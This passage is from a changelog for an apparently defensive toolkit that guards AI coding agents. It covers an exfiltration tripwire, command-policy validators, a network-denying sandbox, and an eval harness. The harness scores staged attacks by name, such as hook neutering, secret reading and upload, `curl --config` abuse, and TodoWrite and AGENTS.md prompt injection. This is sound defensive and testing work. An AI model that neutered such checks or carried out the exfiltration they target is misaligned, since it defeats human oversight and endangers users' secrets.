still **timed out** in the constrained reviewer runtime — wedging at
`check_hook_smoke.py`, which spawned ~16 Python subprocesses (slow startup ×
many = minutes).

| # | Finding | Fix |
|---|---|---|
| P1 | `check_hook_smoke.py` spawned a subprocess per behavioral family probe (~16 total) and could hang/be very slow under constrained Python startup; `--smoke` had no per-validator visibility/timeout. | **`check_hook_smoke.py` is now mostly IN-PROCESS**: the randomized behavioral families call `command_policy.looks_dangerous_command(cmd, "strict")` directly (catches a neutered/overfit policy), and only ~5 subprocesses remain for the adapter EXIT-CODE contracts that can't be checked in-process (exfil-guard rc 2 on secret-read + upload, config-path rc 1, copilot deny, restore JSON). Its `_run` now uses `start_new_session=True` + `os.killpg` on timeout (no orphaned grandchildren). **`--smoke` gains per-validator name echo + a per-validator `timeout` wrapper** (`SUBSTRATE_SMOKE_VALIDATOR_TIMEOUT`, default 45s). **Verified: `check_hook_smoke.py` runs in ~0.7s (was the bottleneck); `--smoke` completes in ~6s and prints each validator as it runs.** Both neuter classes still BLOCK (in-process probe catches a neutered `command_policy`; the subprocess contract catches a neutered `check_exfil_guard` adapter). |

134 tests pass from the extracted artifact; `--smoke` is now robust in
constrained runtimes. With this, the repo-local release-reproducibility path
is A — every remaining non-A grade is Batch-2 / out-of-repo: sandbox
containment (`exfil`/`secret`), the eval/trace harness (`observability`), and
operator-enforced branch protection (`governance`/`CODEOWNERS`/`trusted-base`).

## v3.3.0 — Batch 2.1: adversarial eval/trace harness (observability → A)

The 24th review confirmed the repo-local core is **saturated** and the
remaining grades are out-of-repo: sandbox, operator-config, and the missing
**eval/measurement** layer. This release ships that layer — the thing that
turns "secure / optimized / self-learning" from a claim into a measured,
regression-gated property — plus the last release-polish item.

| Area → target | Change |
|---|---|
| Observability / evalability → A | new `scripts/run_substrate_evals.py` (stdlib, self-contained): runs the REAL validators/hooks against **14 staged adversarial tasks** (profile downgrade, stdlib shadowing, pattern/policy/scanner mutation, hook neuter, secret-read, upload, strict `curl --config`, exfil exit-code, Copilot deny, dangerous config cmd, TodoWrite injection, CURRENT_SESSION fallback) and **4 benign tasks**, scores `malicious_block_rate` + `benign_fp_rate`, and writes a trace to `.substrate/traces/`. Thresholds: block-rate must be **1.0**, FP-rate **0.0**, else exit 1. Wired into `./manage.sh evals`, `release_gate.sh`, and the agent-config-audit workflow; gitignored traces; `evals/README.md` documents it. **Verified: shipped kit → 14/14 blocked, 0/4 FP, exit 0; a neutered `command_policy` → block-rate 0.64, exit 1 (the harness MEASURES, it doesn't rubber-stamp).** |
| Release reproducibility → A | `package_release.sh` now cleans the extraction and prints "passed … workspace cleaned" POST-cleanup (the v3.2.24 polish: completion is unambiguous, not pre-trap). |

The eval harness is the regression net for behavior that pins alone can't
cover, and the first proof-of-value artifact a public adopter can run. 138
tests pass from the extracted artifact.

Remaining for all-A: **sandbox/egress** (exfil/secret) and **operator-enforced
branch protection** (governance/CODEOWNERS/trusted-base — ship `--require` +
one-command setup) — both out of pure repo-local scope.

## v3.3.1 — smoke timeout (final artifact-local fix) + eval expansion

The 25th review confirmed the eval harness is real and the only remaining
artifact-local issue: `--smoke` still timed out — now at the strict block,
which did a SECOND full bootstrap (the first completed in the slow container;
the second pushed it over).

| # | Finding | Fix |
|---|---|---|
| P1/P2 | `--smoke` strict profile-lock block ran a second full `bootstrap.sh` (slow in constrained runtimes) and had no per-step attribution. | the strict check no longer bootstraps — it stages the lock MINIMALLY (`required_profile=strict` + a downgraded config + the 4 needed scripts) and asserts `check_substrate_config` refuses. Per-step echo + `$_TO` timeout. The lock is independent of HOW `required_profile` was written; bootstrap-writes-it is covered by the suite + matrix. **Verified: `--smoke` now ~5s with ONE bootstrap, strict step instant + attributable.** |
| eval → A | expanded the harness to **15 malicious / 7 benign** tasks: added `agents_md_injection` (scanner must block an AGENTS.md injection) and benign polyglot config commands (`npm run lint`, `go test ./...`, `ruff check src/`) so the FP guard covers real Node/Go/Python workflows. **Verified: 15/15 blocked, 0/7 FP.** |

138 tests pass from the extracted artifact. Every artifact-local release path
is now fast and attributable; the remaining all-A work is purely out-of-repo
(**sandbox**, **operator-enforced branch protection**) plus further eval
breadth.

## v3.3.2 — execution-shape fix: one-process smoke + attributable evals

The 25th review found the remaining artifact-local issue is no longer a
security gate but an EXECUTION SHAPE: in a constrained runtime where each
`python -I` startup costs seconds, `--smoke` (~10 separate validator launches)
and the eval harness (subprocess-per-task) both exceeded the wall-clock.

| # | Finding | Fix |
|---|---|---|
| P1/P2 | `--smoke` launched ~10 isolated `python -I scripts/<validator>.py` processes; cumulative interpreter startup timed out in slow containers. | new `scripts/run_smoke_verification.py` imports the static validators ONCE and calls each `main()` **in-process** (one interpreter startup), plus in-process `command_policy` behavioral spot-checks — no per-validator subprocess. `package_release.sh --smoke` now runs it as a single process (`$_TO`-bounded). It re-asserts the scripts dir on `sys.path` after `check_import_shadowing` self-scrubs it. **Verified: one-process smoke runs in ~1s locally; `--smoke` is now 1 bootstrap + 1 runner + 1 lock-check, not ~12 launches.** |
| P1/P2 | `run_substrate_evals.py` could be slow/wedge with no attribution in constrained runtimes. | each task now prints its name BEFORE running (`eval malicious/<id> ...`), records per-task elapsed, and the summary reports total time + the 3 slowest tasks. Per-subprocess timeout lowered to 12s; a timeout (rc 124) now counts as a task FAILURE, not a false "blocked". So slowness becomes attributable, bounded data instead of a black-box hang. Eval suite also expanded to 15 malicious / 7 benign (from v3.3.1). |

140 tests pass from the extracted artifact. Every artifact-local path is now
one-process or per-task-bounded and attributable. Remaining all-A work is
purely out-of-repo: **sandbox** (exfil/secret), **operator-enforced branch
protection** (governance), and further **eval breadth**.

## v3.3.3 — eval harness non-wedging (evalability → A)

The 26th review confirmed `--smoke` now completes, but `run_substrate_evals.py
--no-trace` still timed out in the reviewer's slow container "around the
todowrite_injection task and left a `session_handoff.py capture` child
process." The per-task attribution from v3.3.2 located it; this round removes
the wedge itself. No validator was broken (every task passed individually) —
the failure was the harness's *execution shape*.

| # | Finding | Fix |
|---|---|---|
| P1 | The handoff eval tasks (`todowrite_injection`, `current_session_fallback`) spawned a fresh `python3 -I session_handoff.py capture`; that child pays a full interpreter startup AND forks ~6 git children, and the test's own `git init` had no timeout. In a slow container the child wedged and hung the whole suite. | `session_handoff.py` gains an in-process explicit-root API — `capture_for_root(root, hook)` / `restore_for_root(root)` — that rebinds the module's root-derived paths inside a context manager (globals restored on exit) and runs capture/restore with **no subprocess**. The eval now calls these directly; the `git init` and the `session_handoff.py capture` subprocess are gone. `todowrite_injection` dropped from a potential hang to **0.15s in-process**. |
| P1 | No eval task should be able to wedge the entire suite. | Every task now runs under a hard **per-task SIGALRM backstop** (`SUBSTRATE_EVAL_TASK_TIMEOUT`, default 30s). Inner subprocess timeouts (12s) normally fire first; the backstop is the last resort — a wedging task raises `_TaskTimeout`, is recorded as a FAILURE, and the suite continues. POSIX-only (the substrate targets POSIX); platforms without `SIGALRM` fall back to the inner per-subprocess timeouts. |
| P2 | A killed run left no machine record of where it died. | A **partial trace** (`.substrate/traces/evals_progress.json`) is written *before* each task with `{current_task, completed:false, done:[…]}`, then finalized to `completed:true` at the end. If the suite is killed mid-flight, the file names the in-flight task plus everything already done. |
| P2 | One mode forced subprocess-heavy tasks even where time is tight. | New **`--fast`** mode runs only the in-process tasks (command-policy probes + in-process handoff) — no Python child spawn, completes in <1s — for constrained containers; **`--full`** (default) runs all 22 and is what CI/tests use. Mode is reported in the summary (`substrate-evals[fast]`) and the trace metrics. |

144 tests pass from the extracted artifact (4 new: fast-mode subset, in-process
handoff is-not-a-subprocess guard, in-process root API + global-restore,
per-task backstop). `--full` is 15/15 malicious blocked + 0/7 benign FP in
~1.5s; `--fast` is 5/5 + 0/3 in 0.15s. **The eval harness can no longer wedge
in any runtime.** Remaining all-A work is purely out-of-repo: **sandbox**
(exfil/secret) and **operator-enforced branch protection** (governance).

## v3.3.4 — full-mode wall-clock: parallel heavy phase (evalability → A)

The 27th review confirmed v3.3.3 fixed smoke and the handoff wedge, and that
`--fast` passes — but `--full` STILL exceeded the wall-clock in the reviewer's
slow container, now timing out around `hook_neuter` (task #6). Root cause was
correctly diagnosed as cumulative subprocess cost: full mode ran ~14 heavy
tasks, each spawning its own `python3 -I` validator/hook, **serially**. Where
each interpreter startup costs several seconds, the sum blows past the window.
No validator was broken (every task passes alone, and `--fast` passes).

| # | Finding | Fix |
|---|---|---|
| P1 | ~14 heavy subprocess-backed tasks ran serially; cumulative `python3 -I` startup exceeded the constrained wall-clock. | The heavy tasks now run **concurrently** in a `ThreadPoolExecutor` (`SUBSTRATE_EVAL_WORKERS`, default 8) — they are subprocess-bound, so threads give real overlap. Wall-clock drops from ~Σ(startups) to ~`ceil(heavy/workers)` startups. In-process tasks still run serially first. Locally: full mode **wall 0.69s vs sum 1.73s**; in a slow container the gap is far larger (2 waves of startup, not 14). |
| P2 (Fix D) | `_run_task` wrapped subprocess tasks in `SIGALRM`; an alarm firing inside `proc.communicate()` could interrupt the parent before `_run`'s own timeout killed the child ("parent interrupted, child survives"). | `SIGALRM` is now used **only** for in-process, main-thread tasks (it can't be set off the main thread anyway). Heavy tasks run in worker threads with **no** `SIGALRM` and rely on `_run`'s 12s `killpg` subprocess timeout for hard containment. |
| P2 (Fix A) | A constrained runtime had no way to isolate a single heavy task in its own bounded process. | New **`--run-one <task_id>`** runs exactly one task in this process and prints its JSON record (exit 0 ok / 1 failed / 2 unknown). Heavy tasks dispatch through `_timed` (no SIGALRM), in-process through `_timed_inproc` (SIGALRM). |
| P2 (Fix C) | A timed-out heavy task should yield a bounded record, not just console output. | Each heavy task is bounded at 12s; a timeout returns `rc 124` → recorded as a FAILED task (`detail="TIMEOUT (could not verify)"`, `seconds≈12`) in `results` and the trace. The trace/metrics now also report `wall_seconds` (elapsed) alongside `total_seconds` (sum), plus `heavy_workers`. |

146 tests pass from the extracted artifact (2 new: heavy-tasks-run-in-parallel
[`wall ≤ sum`], `--run-one` isolation + unknown-id exit 2). `--full` completes
with **wall ≪ sum** and cannot wedge: in-process serial + heavy parallel, every
heavy task hard-capped at 12s with `killpg` cleanup. Diagnostics route to stderr
in `--json` mode so stdout is pure JSON. **Full mode now completes (or yields a
bounded failed-task record) in any runtime** — the bar the reviewer set for
evalability A. Remaining all-A work is out-of-repo only: **sandbox**
(exfil/secret) and **operator-enforced branch protection** (governance).

## v3.3.5 — eval timeout calibration (evalability → A in the slow runtime)

The 28th review confirmed v3.3.4 fixed the wedge — full mode now completes with
bounded, attributable results instead of hanging. But it still exited non-zero
in the reviewer's slow container because **`hook_neuter` needs ~12.06s under
8-worker contention while the cap was hard-coded at 12s** (it passes in 11.0s in
isolation). Not a security-logic failure — a **timeout calibration** failure
(margin ~1s). This round makes the eval harness operationally robust without
touching the security model.

| # | Finding | Fix |
|---|---|---|
| P2 | The 12s per-subprocess cap was hard-coded and too tight for a slow-startup runtime under parallel load. | New env-tunable `_SUBPROCESS_TIMEOUT` (`SUBSTRATE_EVAL_SUBPROCESS_TIMEOUT`, **default 30s**). `_run()` reads it. With heavy tasks already parallel, a generous cap barely affects wall-clock but stops a task that passes in isolation from false-failing. A real hang is still a bounded rc-124 FAILURE. (Reviewer Fix A.) |
| P2 | 8 workers oversubscribe a ~2-core throttled container, adding the contention that pushed `hook_neuter` over the cap. | Default workers now **adaptive**: `min(4, max(1, os.cpu_count() or 2))`. Fewer workers ⇒ each heavy task runs nearer its isolated time. CI fast machines set `SUBSTRATE_EVAL_WORKERS=8`. (Reviewer Fix C.) |
| P2 | A timeout was not visible as a calibration value. | Metrics now report `subprocess_timeout` alongside `heavy_workers`; the dispatch line prints the live cap (`per-task cap {N}s`). (Reviewer Fix B.) |

Reviewer Fix D (per-task serial/parallel metadata for `hook_neuter`) was **not**
adopted — the reviewer themselves noted raising the timeout is simpler and
sufficient, and per-task scheduling metadata is YAGNI for one task. The
regression test was strengthened from the reviewer's draft: instead of asserting
`--run-one hook_neuter` exits 0 (which it does regardless of the env, proving
nothing), the tests assert the env vars propagate into `metrics.subprocess_timeout`
/ `metrics.heavy_workers` deterministically.

148 tests pass from the extracted artifact (2 new: metrics-include-subprocess-timeout,
env-override-honored). Local full mode: 15/15 + 0/7, workers 4, cap 30s. **The
remaining eval false-fail in the slow runtime is closed** (cap 30s ≫ observed
12.06s; fewer workers reduce the contention that caused it). Remaining all-A work
is out-of-repo only: **sandbox** (exfil/secret) and **operator-enforced branch
protection** (governance).

## v3.3.6 — README truthfulness (the last artifact-local fix)

The 29th review confirmed v3.3.5 fixed the eval calibration (full mode passes in
the slow runtime: `hook_neuter` 12.53s < 30s cap) and graded the repo-local
core A-/A. The one remaining code-fixable finding was **stale agent-facing
docs**: `README.md` still read `## Current status (v3.3.2)` and listed "No
trace/eval harness" as a limitation — false since v3.3.0, and dangerous because
a future agent reads the README as context and could make stale architectural
decisions.

| # | Finding | Fix |
|---|---|---|
| P2 | README frozen at v3.3.2; falsely claims "No trace/eval harness". | Status header → v3.3.6; added an accurate "Measured behavior" paragraph (the eval harness exists: block-rate/FP-rate over staged adversarial states, parallel heavy phase, adaptive workers, env-tunable cap, `--fast`/`--run-one`, attributable metrics) framed honestly as a **lightweight repo-local** suite, not hosted observability; replaced the stale limitation; remediation range → v3.2.0–v3.3.6. |
| P2 | No gate caught the staleness — it survived three releases. | New `test_readme_current_status_matches_version` asserts the README `## Current status (vX.Y.Z)` equals VERSION. Staleness is now a deterministic test failure, not a discipline — the substrate's own thesis applied to its own docs. |

NOT adopted: the reviewer's optional suggestion to restructure the full pytest
suite like the eval harness (per-task/process-group) — a large change for one
constrained reviewer container, where `--smoke` + evals + targeted validators
already pass; YAGNI. The manifest-not-in-`/mnt/data` and `(1)`-filename items
are the reviewer's upload path, not `package_release.sh` (the manifest ships to
the canonical dist + Drive every round; the sidecar names the canonical zip).

149 tests pass from the extracted artifact (1 new: README-status-matches-VERSION).
**This is the last reviewer-driven artifact-local fix** — the repo-local
security/policy/eval core has converged. Remaining all-A work is the DESIGN.md
re-architecture: **sandbox** (compose `sandbox-runtime`, exfil/secret
containment) and **operator-enforced branch protection** (governance).

## v3.3.7 — maintainer self-audit polish (no reviewer finding)

The 29th external verdict found no new artifact-local blocker. This round is a
maintainer-initiated adversarial self-review for latent imperfections the
external reviewer's fixed check-set wouldn't surface — internal-comment
accuracy, dead code, cross-script consistency, and agent-facing-doc completeness.
Four found and fixed; a `pyflakes` sweep over all 33 scripts is now clean.

| # | Finding | Fix |
|---|---|---|
| polish | `run_substrate_evals.py` carried two stale `12s` comments after v3.3.5 made the per-subprocess cap configurable (default 30s). | Updated the `PER_TASK_TIMEOUT` comment and the `_run_task` docstring to "configurable killpg timeout (`SUBSTRATE_EVAL_SUBPROCESS_TIMEOUT`, default 30s)". Internal docs no longer misstate the live value. |
| dead code | `import uuid` in `run_substrate_evals.py` was unused (the dynamic-canary token expansion lives in `check_harness_patterns.py`/`check_hook_smoke.py`, not here). | Removed. `pyflakes scripts/*.py` now reports zero unused imports / undefined names across the whole tree. |
| consistency | `substrate_doctor.py` resolved its root via bare `Path.cwd()` while every other validator+hook uses the shared `_substrate_root` resolver — so `doctor` launched from a subdirectory would silently check the wrong tree (the exact class `_substrate_root` exists to prevent, v3.2.1). | `doctor` now uses `_substrate_root` (env override / `$CLAUDE_PROJECT_DIR` / git toplevel / ancestor), cwd fallback preserved. Verified the bootstrapped-repo path is unchanged (full suite green). |
| agent-facing doc | `templates/AGENTS.md` "Commands" block listed `doctor/check/audit/release` but **not `evals`** — the substrate's strongest verification command was invisible to the very agent meant to run it. | Added `./manage.sh evals` (with one-line descriptions for each command). The agent now knows the measured-behavior gate exists. |

149 tests pass from the extracted artifact (no test count change — these are
accuracy/cleanup edits, not new behavior; the doctor change is covered by the
existing bootstrapped-repo doctor tests). Sweep result: stale comments fixed,
dead import gone (pyflakes clean), root resolution consistent across all scripts,
agent-facing command list complete. The repo-local core is now polished to the
limit of what artifact-local review reaches; the next move is the DESIGN.md
sandbox spine, not another patch.

## v3.3.8 — final repo-local polish (scoped; last patch before sandbox)

A deliberately narrow, code-fixable polish release agreed with the reviewer
before pivoting to the sandbox tier. No validator-bypass re-hunt; just the
remaining defect + adoption/operator-ergonomics items.

| # | Item | What shipped |
|---|---|---|
| 1 | Root `AGENTS.md` omitted `./manage.sh evals` (only the template was fixed in v3.3.7) — the file an agent reads when working on the kit itself lacked the strongest verification command. | Synced the root `AGENTS.md` command block to the template (with one-line descriptions). |
| 2 | No gate caught command-list drift between root/template/README. | New `test_agent_facing_command_lists_include_evals`: any file documenting the `check`+`release` pair must also list `evals`. |
| 3 | Recurring audit friction: zip+sha reached the reviewer but the manifest didn't, and the renamed-on-upload zip broke `shasum -c`. | `package_release.sh` now emits a **review bundle** — `dist/review/` (zip + .sha256 + manifest + `README_REVIEW.md`) and a single `*-review-bundle.tar.gz`. One uploadable file carries verifiable provenance with names that line up so `shasum -c` works after extraction. |
| 4 | `--smoke` proves the static chain but not setup+pre-commit. | New optional `package_release.sh --smoke-install`: full bootstrap + `manage.sh setup` + `manage.sh check`. Slow + needs network; explicit, not default. |
| 5 | Operators had no single "are we production-ready?" view, risking overclaim. | New `substrate_doctor.py --go-live` (and `manage.sh go-live`): aggregates repo-local PASS/FAIL + a fast eval signal, then a hardening posture (trusted-base, GitHub governance, **sandbox**, memory anchor). **Anti-overclaim by design — it never reports production-hardened while the sandbox tier is absent**, emitting `PASS (repo-local) / NOT PRODUCTION-HARDENED`. |
| 6 | The `scripts/`-is-substrate-reserved convention was only in the README. | Added an agent-facing hard rule to root + template `AGENTS.md` (project scripts go in `tools/`/`bin/`/`project-scripts/`). |
| 7 | `DESIGN.md` shipped (v3.3.6) as agent-facing strategic context but wasn't governed. | Added to `_substrate_surfaces` `CONTEXT_GLOBS` (now harness-scanned — verified clean, 109 files) + `OWNED_FILES`. New `test_design_md_is_governed_surface`. |

Explicitly NOT done (reviewer-deferred or YAGNI): memory-anchor strict check,
branch-protection auto-mutator, `--json` on every validator, full-pytest
restructuring. 153 tests pass from the extracted artifact (4 new). The next
release is the DESIGN.md **sandbox spine** (v3.4.x) — except for one packaging
bug found right after, fixed in v3.3.9.

## v3.3.9 — packaging hygiene (P1: the gate was a silent no-op)

The 30th review found a real **P1 in `package_release.sh`**: from a dirty source
root (a local `.venv/` present), the script built an ~80 MB zip containing
`.venv/` and still printed "Zip hygiene: clean". Two compounding bugs:

1. **The hygiene check was a no-op under `set -o pipefail`.** It piped
   `unzip -l "$ZIP_VER" | grep -Eq …`. When junk matched, `grep -q` closed the
   pipe on first match → `unzip` died with SIGPIPE (141) → pipefail made the
   pipeline non-zero → the `if` evaluated FALSE → the BLOCK branch never ran.
   (And when the tree was clean, `grep` exited 1 → also FALSE.) So the gate
   printed "clean" in *both* cases and could never block — it only ever passed
   because the tree happened to be clean.
2. **`.venv` / `node_modules` were never excluded** from the zip or the
   `source_tree_sha256` in the first place (only `.substrate/venv` was).

The uploaded v3.3.x artifacts were all clean (built from a clean tree), so no
shipped artifact was affected — but the trust-path packaging script could
produce a contaminated artifact from a used working tree. Fixed three ways
(defense in depth):

| Fix | Change |
|---|---|
| A — clean | The pre-package cleanup now `rm -rf`s `.venv`, `.substrate/venv`, `node_modules` (the `find -prune` step only covered the cache dirs). |
| B — exclude | `.venv`, `node_modules`, and the cache dirs are now excluded from BOTH the `zip -x` list AND the `source_tree_sha256` find. |
| C — pipefail-safe gate | The hygiene check writes `unzip -l` to a temp file, then greps the file, so **grep's own exit status is authoritative** (no SIGPIPE). On a hit it prints the offending entries and exits 1. Pattern broadened to `.ruff_cache`/`.mypy_cache`. |

Verified: a planted `.venv/bin/python` at the kit root now yields a build with
**0 `.venv/` entries** in the artifact, exit 0, and the root `.venv` removed.
155 tests pass from the extracted artifact (2 new: a static gate that the
SIGPIPE-prone pipe is gone + `.venv` is excluded, and an end-to-end test that a
dirty `.venv` cannot ship). The next release is the DESIGN.md sandbox spine
(v3.4.x) — bar two cosmetic P2s found right after, fixed in v3.3.10.

## v3.3.10 — bundle metadata + per-block command gate (final P2 polish)

The 31st review confirmed the v3.3.9 packaging P1 is fixed and found no
release-blocker — just two cosmetic P2s. Both fixed.

| # | Finding | Fix |
|---|---|---|
| P2 | The review-bundle tarball carried macOS AppleDouble metadata: `._*` companion files + a `LIBARCHIVE.xattr.com.apple.provenance` header (bsdtar copying the Gatekeeper provenance xattr), which a Linux tar materializes as `._*` on extraction. Contradicted the "four clean files" story. | `package_release.sh` now `xattr -cr`s the review dir (drops the provenance xattr at the source — the real fix; `COPYFILE_DISABLE` alone wouldn't strip the xattr header) and builds with `COPYFILE_DISABLE=1`. Both are no-ops off macOS. Added a **pipefail-safe** bundle hygiene gate (listing → temp file → grep for `._*`/`.DS_Store`), reusing the v3.3.9 SIGPIPE lesson. |
| P2 | The command-list drift test was file-level, not block-level — it passed as long as `evals` appeared *somewhere*, so a secondary `### Build and test commands` block in root + template `AGENTS.md` still listed only `check`+`release`. The test's docstring claimed per-block enforcement it didn't do. | Added `./manage.sh evals` to that secondary block (both files) AND made `test_agent_facing_command_lists_include_evals` **parse each fenced bash block** and require `evals` in every block containing the `check`+`release` pair — the implementation now matches the claim. |

Verified: a planted dirty `.venv` still yields a clean zip; the rebuilt review
bundle extracts with **zero `._*`/.DS_Store** files; every check+release command
block lists `evals`. 155 tests pass from the extracted artifact (no new test
functions — two existing release tests were extended: the static gate now
asserts the metadata-strip + bundle hygiene are present, the end-to-end test now
extracts the bundle and asserts zero `._*`/.DS_Store; and the command-list test
is now block-aware). The next release is the DESIGN.md sandbox spine — bar one
residual metadata leak found right after, fixed in v3.3.11.

## v3.3.11 — review-bundle metadata, robustly clean

The 32nd review confirmed v3.3.10's fixes hold but found the review bundle STILL
emitted `tar: Ignoring unknown extended header keyword
'LIBARCHIVE.xattr.com.apple.provenance'` on extraction (no `._*` files, hashes
still verify — cosmetic, but my v3.3.10 "no xattr warnings" claim was wrong).
Root cause: `com.apple.provenance` is a sticky Gatekeeper xattr that `xattr -cr`
does not reliably clear, so macOS bsdtar embeds it as a PAX `LIBARCHIVE.xattr`
header regardless of `COPYFILE_DISABLE`.

| Fix | Change |
|---|---|
| Build the bundle metadata-clean | `package_release.sh` now builds the review tarball with **Python `tarfile`** (USTAR format, normalized `TarInfo`: `mtime=0`, fixed mode/uid/gid, empty uname/gname) instead of platform `tar`. `tarfile` never reads xattrs, so no provenance header can leak — deterministic and clean on every platform. The `xattr -cr`/`COPYFILE_DISABLE` dance is gone. |
| Stronger hygiene gate | The gate now **fails on any `tar -tzf` stderr** (a stray metadata header prints a warning), on `._*`/`.DS_Store`, AND unless the listing is **exactly the four** review files. All listings go to temp files (pipefail-safe, the v3.3.9 lesson). |

Verified: the rebuilt bundle lists with **zero stderr/warnings**, extracts to
exactly the four files, `shasum -c` passes, and the manifest hash matches. Tests:
a static gate (tarfile creation + the two new BLOCK messages present) and the
end-to-end test now also asserts the listing is warning-free and exactly four
files. 156 tests pass from the extracted artifact (1 new: the tarfile-creation
static gate; the end-to-end test was extended). The next release is the
DESIGN.md sandbox spine — preceded by one small operator-ergonomics patch
(v3.3.12) that builds the shared infrastructure the sandbox/governance layers
plug into.

## v3.3.12 — operator ergonomics (shared infra for sandbox/governance)

Per the reviewer's rule — *do it now only if it becomes shared infrastructure
for sandbox/governance/evals; defer anything that's just a nicer report or
optional integration* — two items qualified and were built; everything else
(memory-anchor check, live-host tests, matrix-in-manifest, per-validator JSON,
broader evals, `--smoke-install` phase timers) is deferred to after sandbox.

| Item | Why it's shared infra | What shipped |
|---|---|---|
| **`go-live --json`** | The single machine-readable readiness contract that sandbox, governance, installers, and agents add rows to — instead of inventing new user-facing checks each time. | `substrate_doctor.py --go-live --json` (and `./manage.sh go-live --json`) emits `{repo_local, production_hardened, checks[]}` with stable check ids (`validators`, `evals`, `trusted_base_workflow`, `github_governance`, `sandbox`, `memory_anchor`). `production_hardened` is **always false while the sandbox tier is absent** (anti-overclaim). The text report was refactored onto the same structured result. |
| **`setup_branch_protection.sh`** | Gives the operator-config gap (the #1 remaining governance blocker) a concrete, low-friction path. | New read-only helper: `--plan` prints the exact strict GitHub settings (PR required, Code Owner review, trusted-base + CI required checks, no force-push/deletion); `--check` verifies them via `check_github_governance.py --require`. **No `--apply`** — enabling protection stays an explicit operator action. |

Also completed the `scripts/`-reserved-namespace note in OPERATOR_ENABLEMENT
(README + AGENTS already had it) and documented both new tools there. The review
bundle (v3.3.11) and command-list gate (v3.3.10) were already done — no rework.

158 tests pass from the extracted artifact (2 new: the go-live JSON contract and
the branch-protection plan/check). Validators + doc gates clean; the new
`setup_branch_protection.sh` passes the harness scan (110 surfaces). **This is
the last repo-local patch — for real.** The next release is the DESIGN.md
**sandbox spine** (v3.4.0), a capability tier — preceded by one one-line side-
effect fix (v3.3.13).

## v3.3.13 — go-live must not mutate the tree

The 33rd review confirmed v3.3.12 is real and found one P2: `./manage.sh go-live
--json` could **create a project `.venv`** and print `uv` installer noise to
stderr in a Python source tree. Cause: `manage.sh`'s `run_py` falls back to
`uv run python` (which creates/syncs `.venv`) when the substrate venv is absent.
Fine for `check`/gates; wrong for a read-only **readiness report** — `go-live`
should be non-mutating, quiet, and JSON-clean on stdout.

Fix: a side-effect-light **`run_py_system`** runner (substrate venv if present,
else system `python3 -I` — **no `uv run` fallback**), and `doctor` + `go-live`
now route through it. `check`/`setup`/gates keep `run_py` (they legitimately
want the project toolchain). Verified: with the substrate venv absent in a
source tree with `pyproject.toml`, `./manage.sh go-live --json` now emits valid
JSON, creates **no `.venv`**, and prints no installer noise.

160 tests pass from the extracted artifact (2 new: a static gate that
doctor/go-live route through `run_py_system` with no `uv run`, and an end-to-end
test that `go-live --json` creates no project `.venv`). **This is the last
repo-local patch.** Next is the DESIGN.md **sandbox spine** (v3.4.0).

# v3.4.0 — sandbox spine: egress CONTAINMENT (not just detection)

The first capability tier beyond repo-local hardening, and the genuine
risk-model change the audit series kept pointing at: the exfil guard is a
TRIPWIRE (pattern matching an attacker can mutate around); this adds opt-in
**containment** that denies network egress at the kernel.

**What shipped**
- **`scripts/sandbox_exec.sh`** — wraps a command in the OS sandbox with network
  egress DENIED: macOS `sandbox-exec` (Seatbelt `(deny network*)`), Linux
  `bwrap --unshare-net` (private, unconnected net namespace). **Fail-closed:**
  if no OS sandbox is present it REFUSES (exit 3) rather than run unsandboxed.
  `--available` probes capability.
- **`SUBSTRATE_SANDBOX`** config key (data, validated to `{0,1}`); bootstrap
  writes `SUBSTRATE_SANDBOX="0"` by default (opt-in).
- **`go-live`** `sandbox` row is now computed: `pass` when `SUBSTRATE_SANDBOX=1`
  AND an OS sandbox is available; otherwise an honest `warn` with the reason.
  `production_hardened` flips toward true only when this passes.
- Docs (README limitation, OPERATOR_ENABLEMENT) updated; `00_substrate.md`
  reviewed + covers the two new scripts.

**Containment is PROVEN, not asserted.** On macOS, a socket op the kernel
otherwise allows (baseline → `ConnectionRefusedError`) becomes
`PermissionError [Errno 1] Operation not permitted` under the wrapper — the
kernel actively denies the network operation, independent of connectivity. The
regression test asserts exactly this EPERM signal (macOS-gated, where it's
unambiguous; Linux uses the standard `bwrap --unshare-net` primitive). 164 tests
pass from the extracted artifact (4 new: sandbox probe/usage, non-network exec,
the macOS containment EPERM proof, and `SUBSTRATE_SANDBOX` validation).

**Design note:** DESIGN.md proposed composing Anthropic's npm
`sandbox-runtime`; this composes the SAME OS primitives (`sandbox-exec`/`bwrap`)
**directly**, with no npm dependency — consistent with the kit's stdlib-only /
no-unpinned-deps principle. The npm package can be slotted in later if richer
allowlist-egress is needed.

**Honest scope (this tier):** default-DENY egress (no network), not yet
allowlisted egress; network containment, not yet filesystem write-scoping;
macOS + Linux only (no Windows). Enforcing it for the agent (pointing the
agent's shell at `sandbox_exec.sh`) is an operator/host wiring step, documented
in OPERATOR_ENABLEMENT. This moves exfil/secret from a tripwire toward
containment — the oldest, most-cited limitation in the audit series.

## v3.4.1 — CI green: two failure CLASSES fixed (not just symptoms)

Publishing to GitHub turned the kit into a real git repo and surfaced two CI
failures that local packaging never hit. Both are fixed at the class level with
regression tests, per "make sure these don't happen again":

| Failing job | Root cause | Class-fix |
|---|---|---|
| `CI / checks` (`manage.sh check` → doc-drift) | `last_human_reviewed` is a FROZEN date; a whole-tree commit / fresh clone stamps every covered script with a later git date → STALE on every commit, forever. Local never saw it (not a committed git repo until publish). | `check_doc_drift._doc_stale`: a covered file is stale only if committed AFTER its doc's review date **AND after the doc's own last commit**. Committing the doc *with* the code IS the review, so whole-tree commits and clones never falsely flag. User-repo protection preserved (code changed in a later commit than its doc still flags). Unit-tested both directions. |
| `Release matrix / full-setup (strict, none)` | strict `check` runs `doctor --strict`, which requires an ACTIVE CODEOWNERS with a real owner — a throwaway CI repo has only `CODEOWNERS.suggested` → BLOCK. | The strict matrix job now synthesizes `.github/CODEOWNERS` = `* @${{ github.repository_owner }}` before `check`, so it tests that strict governance PASSES when configured. Verified locally: `doctor --strict-governance` BLOCKs without it, PASSes with it. Static-tested. |

Why local passed but CI didn't: `package_release --full` runs the validators
from an extracted (non-git) artifact, so the git-date staleness couldn't appear;
and the matrix's fresh-strict-bootstrap path isn't in the unit suite. The two
class-fixes remove both failure modes structurally; the regression tests lock
them. 166 tests pass.

## v3.4.2 — CI green: the THIRD class (two-validator config drift)

v3.4.1 fixed two of three classes; the matrix `full-setup` jobs still failed —
this fixes the third, found by CI. v3.4.0 added `SUBSTRATE_SANDBOX` to the
Python validator (`check_substrate_config.py`), to `bootstrap` (which writes
`SUBSTRATE_SANDBOX="0"`), and to `go-live` — but **NOT to the shell config
loader** (`scripts/_substrate_config.sh`) that `manage.sh` sources on every
call. So a freshly-bootstrapped repo's config tripped `manage.sh setup` with
